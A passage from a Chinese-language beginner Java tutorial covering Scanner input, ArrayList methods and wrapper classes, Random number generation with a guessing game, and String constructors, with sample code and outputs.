class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo02ScannerSum</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Scanner sc = <span class="hljs-keyword">new</span> Scanner(System.in);<br><br>        System.out.println(<span class="hljs-string">"请输入第一个数字："</span>);<br>        <span class="hljs-keyword">int</span> a = sc.nextInt();<br>        System.out.println(<span class="hljs-string">"请输入第二个数字："</span>);<br>        <span class="hljs-keyword">int</span> b = sc.nextInt();<br><br>        <span class="hljs-keyword">int</span> result = a + b;<br>        System.out.println(<span class="hljs-string">"结果是："</span> + result);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>输出显示：</p>
<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs code">请输入第一个数字：<br>23<br>请输入第二个数字：<br>45<br>结果是：68<br></code></pre></div></td></tr></table></figure>


<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/*<br>题目：<br>键盘输入三个int数字，然后求出其中的最大值<br><br> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo03ScannerMax</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Scanner sc = <span class="hljs-keyword">new</span> Scanner(System.in);<br><br>        System.out.println(<span class="hljs-string">"请输入第一个数字"</span>);<br>        <span class="hljs-keyword">int</span> a = sc.nextInt();<br>        System.out.println(<span class="hljs-string">"请输入第二个数字"</span>);<br>        <span class="hljs-keyword">int</span> b = sc.nextInt();<br>        System.out.println(<span class="hljs-string">"请输入第三个数字"</span>);<br>        <span class="hljs-keyword">int</span> c = sc.nextInt();<br><br>        <span class="hljs-keyword">int</span> temp = a &gt; b ? a : b;<br>        <span class="hljs-keyword">int</span> max = temp &gt; c ? temp : c;<br>        System.out.println(<span class="hljs-string">"最大值为："</span> + max);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>输出显示：</p>
<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs code">请输入第一个数字<br>23<br>请输入第二个数字<br>43<br>请输入第三个数字<br>67<br>最大值为：67<br></code></pre></div></td></tr></table></figure>


<h2 id="ArrayList类"><a href="#ArrayList类" class="headerlink" title="ArrayList类"></a>ArrayList类</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/*<br>数组的长度不可以发生改变。<br>但是ArrayList集合的长度是可以随意变化的。<br><br>对于ArrayList来说，有一个尖括号&lt;E&gt;代表泛型<br>泛型：也就是装在集合中的所有元素，全都是统一的什么类型<br>注意：泛型只能是引用类型，不能是基础类型。<br><br>注意事项：<br>对于ArrayList集合来说，直接打印得到的不是地址值，而是内容。<br>如果内容为空，得到的是空的中括号：[]<br> */</span><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo02ArrayList</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        ArrayList&lt;String&gt; list = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        System.out.println(list);<br><br>        <span class="hljs-comment">//向集合当中添加一些数据，需要用到add方法。</span><br>        list.add(<span class="hljs-string">"小方①号"</span>);<br>        System.out.println(list);<br><br>        list.add(<span class="hljs-string">"小方②号"</span>);<br>        list.add(<span class="hljs-string">"小方③号"</span>);<br>        list.add(<span class="hljs-string">"小方④号"</span>);<br>        System.out.println(list);<br><br><span class="hljs-comment">//        list.add(100);    //错误写法！因为创建的时候尖括号泛型已经说了是字符串，添加进去的元素就必须都是字符串才行</span><br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>这里介绍一下ArrayList中常见的方法，主要有添加，查找，删除和获取长度</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-comment">/*<br>ArrayList 当中的常用方法有：<br><br>public boolean add(E e):向集合当中添加元素，参数的类型和泛型一致。返回值代表添加成功。<br>备注：对于ArrayList集合来说，add添加动作一定是成功的，所以返回值可用可不用<br>但是对于其他集合(今后学习)来说，add添加动作不一定成功。<br><br>public E get(int index):从集合当中获取元素，参数是索引编号，返回值就是对应位置的元素<br><br>public E remove(int index):从集合当中删除元素，参数是索引编号，返回值就是被删除掉的元素。<br><br>public int size():获取集合的尺寸长度，返回值是集合中包含的元素个数。<br> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo03ArrayListMethod</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        ArrayList&lt;String&gt; list = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        System.out.println(list);   <span class="hljs-comment">//[]</span><br><br>        <span class="hljs-comment">//向集合中添加元素：add</span><br>        <span class="hljs-keyword">boolean</span> success = list.add(<span class="hljs-string">"小方①号"</span>);<br>        System.out.println(<span class="hljs-string">"添加是否成功："</span> + success);<br>        System.out.println(list);<br><br>        list.add(<span class="hljs-string">"小方②号"</span>);<br>        list.add(<span class="hljs-string">"小方③号"</span>);<br>        list.add(<span class="hljs-string">"小方④号"</span>);<br>        System.out.println(list);<br><br>        <span class="hljs-comment">// 从集合中获取元素：get。索引值从0开始</span><br>        String name = list.get(<span class="hljs-number">2</span>);<br>        System.out.println(<span class="hljs-string">"第②号索引位置："</span> + name);<br><br>        <span class="hljs-comment">// 从集合中删除元素：remove。索引值从0开始</span><br>        String whoRemove = list.remove(<span class="hljs-number">3</span>);<br>        System.out.println(<span class="hljs-string">"被删除的人是："</span> + whoRemove);<br>        System.out.println(list);<br><br>        <span class="hljs-comment">//获取集合的长度尺寸，也就是其中元素的个数</span><br>        <span class="hljs-keyword">int</span> size = list.size();<br>        System.out.println(<span class="hljs-string">"集合的长度是："</span> + size);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs code">[]<br>添加是否成功：true<br>[小方①号]<br>[小方①号, 小方②号, 小方③号, 小方④号]<br>第②号索引位置：小方③号<br>被删除的人是：小方④号<br>[小方①号, 小方②号, 小方③号]<br>集合的长度是：3<br></code></pre></div></td></tr></table></figure>

<h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo04ArrayListEach</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        ArrayList&lt;String&gt; list= <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        list.add(<span class="hljs-string">"小方①号"</span>);<br>        list.add(<span class="hljs-string">"小方②号"</span>);<br>        list.add(<span class="hljs-string">"小方③号"</span>);<br><br>        <span class="hljs-comment">//遍历集合 list.fori</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; list.size(); i++) &#123;<br>            System.out.println(list.get(i));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<h3 id="基本类型存储"><a href="#基本类型存储" class="headerlink" title="基本类型存储"></a>基本类型存储</h3><p>上面我们提到了，泛型只能是引用类型，不能是基础类型。那我们如何实现基本类型的存储呢？<br>如果希望向集合ArrayList当中存储基本类型数据，必须使用基础数据类型对于的”包装类”。</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-comment">/*<br>如果希望向集合ArrayList当中存储基本类型数据，必须使用基本数据类型对于的"包装类"。<br><br>基本类型     包装类(引用类型，包装类都位于java，lang包下)<br>byte        Byte<br>short       Short<br>int         Integer    [特殊]<br>float       Float<br>double      Double<br>char        character  [特殊]<br>boolean     Boolean<br><br>从JDK 1.5+开始，支持自动装箱、自动拆箱<br><br>自动装箱：基本类型 --&gt; 包装类型<br>自动拆箱：包装类型 --&gt; 基本类型<br> */</span><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo05ArrayListBasic</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        ArrayList&lt;String&gt; ListC = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        <span class="hljs-comment">//错误写法！泛型只能是引用类型，不能是基本类型</span><br><span class="hljs-comment">//        ArrayList&lt;int&gt; ListB = new ArrayList&lt;&gt;();</span><br><br>        ArrayList&lt;Integer&gt; listA = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        listA.add(<span class="hljs-number">100</span>);<br>        listA.add(<span class="hljs-number">200</span>);<br>        System.out.println(listA);	<span class="hljs-comment">//打印集合</span><br><br>        <span class="hljs-keyword">int</span> num = listA.get(<span class="hljs-number">1</span>);<br>        System.out.println(<span class="hljs-string">"第一号元素是："</span> + num);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs code">[100, 200]<br>第一号元素是：200<br></code></pre></div></td></tr></table></figure>

<h2 id="Random类"><a href="#Random类" class="headerlink" title="Random类"></a>Random类</h2><p>Random类用来生成随机数字。使用其实也是三个步骤,导包-&gt;创建-&gt;使用。</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/*<br>1. 导包<br>import java.util.Random;<br><br>2. 创建<br>Random r = new Random();    //小括号当中留空即可<br><br>3. 使用<br>获取一个随机的int数字(范围是int所有范围，有正负两种)：int num = r.nextInt()<br> */</span><br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo01Random</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Random r = <span class="hljs-keyword">new</span> Random();<br><br>        <span class="hljs-keyword">int</span> num = r.nextInt();<br>        System.out.println(<span class="hljs-string">"随机数是："</span> + num);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs code">随机数是：2128661138<br></code></pre></div></td></tr></table></figure>

<p>Random也可以实现在给定的范围内，获取随机数字，如代码实现：</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/*<br>题目要求：<br>根据int变量n的值，来获取随机数字，范围是[1,n], 可以取到1也可以取到n。<br> */</span><br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo03Random</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> n = <span class="hljs-number">5</span>;<br><br>        Random r = <span class="hljs-keyword">new</span> Random();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>            <span class="hljs-keyword">int</span> result = r.nextInt(n) + <span class="hljs-number">1</span>;	<span class="hljs-comment">//循环100遍</span><br>            System.out.println(result);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>玩个游戏,电脑实现随机产生一个数字，你来猜测，如果你输入的值相比于随机产生的值偏大了，电脑反馈太大了，如果你输入的值相比于随机产生的值偏小了，电脑反馈太小了，如果相等，退出游戏。</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo04RandomGame</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Random r = <span class="hljs-keyword">new</span> Random();<br>        <span class="hljs-keyword">int</span> randomNum = r.nextInt(<span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br>        Scanner sc = <span class="hljs-keyword">new</span> Scanner(System.in);<br><br>        <span class="hljs-keyword">while</span>( <span class="hljs-keyword">true</span> ) &#123;<br>            System.out.println(<span class="hljs-string">"请输入你猜测的数:"</span>);<br>            <span class="hljs-keyword">int</span> guessNum = sc.nextInt();<br><br>            <span class="hljs-keyword">if</span> ( guessNum &lt; randomNum ) &#123;<br>                System.out.println(<span class="hljs-string">"太小了，请重试"</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( guessNum &gt; randomNum ) &#123;<br>                System.out.println(<span class="hljs-string">"太大了，请重试"</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                System.out.println(<span class="hljs-string">"恭喜你，猜对了"</span>);<br>                <span class="hljs-keyword">break</span>;  <span class="hljs-comment">//如果猜中，退出</span><br>            &#125;<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">"游戏结束。"</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>贴出一个小例子</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/*题目：<br>用一个大集合存入20个随机数字，然后筛选其中的偶数，放到小集合当中。<br>要求使用自定义的方法来实现筛选。<br> */</span><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo04ArrayListReturn</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        ArrayList&lt;Integer&gt; bigList = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        Random r = <span class="hljs-keyword">new</span> Random();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++) &#123;<br>            <span class="hljs-keyword">int</span> num = r.nextInt(<span class="hljs-number">10</span>) + <span class="hljs-number">1</span>;<br>            bigList.add(num);<br><span class="hljs-comment">//            bigList.add(r.nextInt(10) + 1);</span><br>        &#125;<br>        System.out.println(bigList);<br><br>        ArrayList&lt;Integer&gt; smallList = getSmallList(bigList);<br><br>        System.out.println(<span class="hljs-string">"偶数总共有："</span> + smallList.size() + <span class="hljs-string">"个"</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; smallList.size(); i++) &#123;<br>            System.out.println(smallList.get(i));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 这个方法，接收大集合参数，返回小集合结果</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ArrayList&lt;Integer&gt; <span class="hljs-title">getSmallList</span><span class="hljs-params">(ArrayList&lt;Integer&gt; bigList)</span></span>&#123;<br>        <span class="hljs-comment">// 创建一个小集合，用来装偶数结果</span><br>        ArrayList&lt;Integer&gt; smallList = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; bigList.size(); i++) &#123;<br>            <span class="hljs-keyword">int</span> num = bigList.get(i);<br>            <span class="hljs-keyword">if</span> ( bigList.get(i) % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> )&#123;<br><span class="hljs-comment">//                smallList.add(bigList.get(i));</span><br>                smallList.add(num);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> smallList;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs code">[5, 5, 4, 1, 10, 1, 6, 9, 3, 7, 6, 2, 3, 9, 2, 4, 10, 1, 9, 1]<br>偶数总共有：8个<br>4<br>10<br>6<br>6<br>2<br>2<br>4<br>10<br></code></pre></div></td></tr></table></figure>

<h2 id="String类"><a href="#String类" class="headerlink" title="String类"></a>String类</h2><p>字符串特点：</p>
<ol>
<li>字符串的内容永不可变;</li>
<li>正是因为字符串不可改变，所以字符串是可以共享使用的;</li>
<li>字符串效果上相当于是char[]字符数组，但是底层原理是byte[]字节数组。</li>
</ol>
<p>创建字符串的常见3+1种方式。<br>三种构造方式：<br>public String():创建一个空白字符串，不含有任何内容<br>public String(char[] array):根据字符数组的内容，来创建对应的字符串。<br>public String(byte[] array):根据字符数组的内容，来创建对应的字符串。<br>一种直接创建：<br>String str[] = “Hello”;     //右边直接用双引号</p>
<p>注意：直接写上双引号，就是字符串对象</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo01String</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">// 使用空参构造</span><br>        String str1 = <span class="hljs-keyword">new</span> String();<br>        System.out.println(<span class="hljs-string">"第①个字符串："</span> + str1);<br><br>        <span class="hljs-comment">// 根据字符数组创建字符串</span><br>        <span class="hljs-keyword">char</span>[] charArray = &#123; <span class="hljs-string">'A'</span>, <span class="hljs-string">'B'</span>, <span class="hljs-string">'C'</span> &#125;;<br>        String str2 = <span class="hljs-keyword">new</span> String(charArray);<br>        System.out.println(<span class="hljs-string">"第②个字符串:"</span> + str2);<br><br>        <span class="hljs-comment">//根据字节数组创建字符串</span><br>        <span class="hljs-keyword">byte</span>[] byteArray = &#123; <span class="hljs-number">97</span>, <span class="hljs-number">98</span>, <span class="hljs-number">99</span> &#125;;<br>        String str3 = <span class="hljs-keyword">new</span> String(byteArray);<br>        System.out.println(<span class="hljs-string">"第③个字符串:"</span> + str3);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">第①个字符串：<br>第②个字符串:ABC<br>第③个字符串:abc<br></code></pre></div></td></tr></table></figure>

<h3 id="字符串常量池"><a href="#字符串常量池" class="headerlink" title="字符串常量池"></a>字符串常量池</h3><p>字符串常量池：程序当中直接写上的双引号字符串，就在字符串常量池中。</p>
<p>对于基本类型来说，==是进行数值的比较<br>对于引用类型来说，==是进行[地址值]的比较</p>
<p>举个栗子：</p>
